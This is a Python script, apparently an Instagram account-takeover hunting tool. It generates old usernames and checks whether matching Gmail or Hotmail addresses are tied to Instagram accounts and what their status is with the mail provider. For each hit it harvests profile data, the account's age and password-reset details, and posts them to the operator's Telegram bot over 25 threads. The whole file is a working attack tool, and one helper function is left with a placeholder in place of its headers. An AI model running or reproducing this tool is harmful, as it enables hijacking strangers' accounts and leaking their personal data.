import requests
import sys
from threading import Thread
from instagramtolle import GMAIL, instagram, HOTMAIL
from asmix import Instagram
import random
import time
from time import sleep
from urllib.parse import quote
import os
from datetime import datetime

def get_real_time():
    try:
        r = requests.head("https://www.google.com", timeout=5)
        date_str = r.headers['Date']
        real_time = datetime.strptime(date_str, "%a, %d %b %Y %H:%M:%S %Z")
        return real_time
    except:
        return None

# وقت الانتهاء:
expiration_time = datetime(2025, 4, 7, 16, 0, 0)

real_time = get_real_time()
if not real_time:
    print("⚠️ لم نستطع التحقق من الوقت الحقيقي.")
    exit()

if real_time > expiration_time:
    print("⛔ انتهت صلاحية الأداة.")
    exit()

# الأداة تشتغل هنا:
print(f"تاريخ انتهاء الاداة {expiration_time}")




c = print("""
            ██╗  ██╗ █████╗ ██╗     
            ██║ ██╔╝██╔══██╗██║     
            █████╔╝ ███████║██║     
            ██╔═██╗ ██╔══██║██║     
            ██║  ██╗██║  ██║███████╗
            ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
\n\n\n\n""")
CHAT_ID = input('Enter Your ID : ')
BOT_TOKEN = input('Enter Your Token : ')
print("=============================")
print("     Domain you want check from\n\n           1 - gmail\n           2 - hotmail\n\n ")
Domain = str(input("     Choose : "))
print("=============================")

good = 0
bad_instagram = 0
bad_email = 0
error = 0


def choode():
    if Domain == '1':
        ff = 'gmail.com'

    elif Domain == '2':
        ff = 'hotmail.com'

    return ff


check = choode()

def escape_markdown(text):
    if not text:
        return ""
    special_chars = r"_*[]()~`>#+-=|{}.!"
    return ''.join(f"\\{c}" if c in special_chars else c for c in str(text))

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "MarkdownV2"
    }
    response = requests.post(url, data=payload)


def info(user):
    try:
        params = {'username': user}
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Referer': "https://trendhero.io/instagram-follower-count/",
            'Accept-Language': "en-US,en;q=0.9"
        }
        
        for attempt in range(3):
            try:
                response = requests.get(
                    "https://trendhero.io/api/get_er_reports",
                    params=params,
                    headers=headers,
                    timeout=15
                )
                response.raise_for_status()
                data = response.json()
                break
            except Exception as e:
                if attempt == 2:
                    raise e
                time.sleep(2)

        user_info = data.get('preview', {}).get('user_info', {})
        
        user_id = user_info.get('id')
        if user_id and user_id.isdigit():
            user_id = int(user_id)
            if 1 < user_id <= 1278889:
                date = "2010"
            elif 1279000 <= user_id <= 17750000:
                date = "2011"
            elif 17750001 <= user_id <= 279760000:
                date = "2012"
            elif 279760001 <= user_id <= 900990000:
                date = "2013"
            elif 900990001 <= user_id <= 1629010000:
                date = "2014"
            elif 1629010001 <= user_id <= 2369359761:
                date = "2015"
            elif 2369359762 <= user_id <= 4239516754:
                date = "2016"
            elif 4239516755 <= user_id <= 6345108209:
                date = "2017"
            elif 6345108210 <= user_id <= 10016232395:
                date = "2018"
            elif 10016232396 <= user_id <= 27238602159:
                date = "2019"
            elif 27238602160 <= user_id <= 43464475395:
                date = "2020"
            elif 43464475396 <= user_id <= 50289297647:
                date = "2021"
            elif 50289297648 <= user_id <= 57464707082:
                date = "2022"
            elif 57464707083 <= user_id <= 63313426938:
                date = "2023"
            else:
                date = "2024+"
        else:
            date = "Unknown"

        full_name = user_info.get('full_name', 'N/A')
        followers = user_info.get('follower_count', 'N/A')
        following = user_info.get('following_count', 'N/A')
        posts = user_info.get('media_count', 'N/A')
        
        try:
            reset_info = instagram.Reset(user).get('data', {}).get('reset', 'N/A')
            recovery_email = reset_info.split('@')[0] + "..." if '@' in reset_info else reset_info
        except:
            reset_info = "N/A"

        def escape_markdown(text):
            if not text:
                return ""
            special_chars = r"_*[]()~`>#+-=|{}.!"
            return ''.join(f"\\{c}" if c in special_chars else c for c in str(text))

        message = f"""
📌 *Instagram Info*  
━━━━━━━━━━━━━━━  
👤 *User*: `{escape_markdown(user)}`  
📛 *Name*: `{escape_markdown(full_name)}`  
📧 *Email*: `{escape_markdown(user)}@{escape_markdown(check)}`  
🖼 *Posts*: `{escape_markdown(posts)}`  
📅 *Date*: `{escape_markdown(date)}`  
👥 *Followers*: `{escape_markdown(followers)}`  
🔄 *Following*: `{escape_markdown(following)}`
🔑 *Reset*: `{escape_markdown(reset_info)}`  
━━━━━━━━━━━━━━━  
💡 *By*: @BJRRR  
"""

        telegram_endpoints = [
            "https://api.telegram.org",
            "https://api.telegram-bot.org",
            "https://telegram-bot-api.herokuapp.com"
        ]

        for endpoint in telegram_endpoints:
            try:
                url = f"{endpoint}/bot{BOT_TOKEN}/sendMessage"
                response = requests.post(
                    url,
                    json={
                        "chat_id": CHAT_ID,
                        "text": message,
                        "parse_mode": "MarkdownV2",
                        "disable_web_page_preview": True
                    },
                    timeout=15
                )
                if response.status_code == 200:
                    print(f"[+] Done send to telegram\n")
                    return True
            except Exception as e:
                print(f"[-] Bad send to telegram : {str(e)}\n")
        
        print("[-] All Telegram endpoints failed\n")
        return False

    except Exception as e:
        error_msg = f"⚠️ Error checking @{user}: {str(e)}\n"
        print(error_msg)
        
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": CHAT_ID,
                    "text": f"Error checking @{user}: {escape_markdown(str(e))}",
                    "parse_mode": "MarkdownV2"
                },
                timeout=10
            )
        except:
            pass
        
        return False
        

def fetch_trendhero_data(user, max_retries=3):
    for attempt in range(max_retries):
        try:
            response = requests.get(
                "https://trendhero.io/api/get_er_reports",
                params={'username': user},
                headers={...},
                timeout=10
            )
            if response.status_code == 200:
                return response.json()
        except Exception as e:
            print(f"Attempt {attempt + 1} failed: {str(e)}")
            sleep(2)
    return None

        
def check_hot(user):
    global good, bad_email
    user1 = f'{user}@hotmail.com'
    hot_status = HOTMAIL.CheckEmail(user1).get("data").get("status")
    if hot_status == True:
        good+=1
        info(user)

    elif hot_status == False:
        bad_email+=1

def check_gmail(user):
    global good, bad_email
    gmail_status = GMAIL.CheckEmail(user).get("data").get("status")
    if gmail_status == True:
        good+=1
        info(user)

    elif gmail_status == False:
        bad_email+=1


def insta(user):
    global bad_instagram
    user1 = f'{user}@{check}'
    check_status = instagram.CheckEmail(user1).get("data").get("status")

    if check_status == True:
        if Domain == '1':
            check_gmail(user)

        elif Domain == '2':
            check_hot(user)
        

    elif check_status == False:
        bad_instagram+=1
        sys.stdout.write(f"\rHits : {good} | Bad_Insta : {bad_instagram} | Bad_Email : {bad_email} | Error : {error}\r")



def kal():
    while True:
        try:
            generated_user = instagram.generateUsername2013()
            user = generated_user["data"]["username"]
            if user and "None" not in user:
                user = f"{user}"
                insta(user)
        except:
            pass

for i in range(25):
    Thread(target=kal).start()
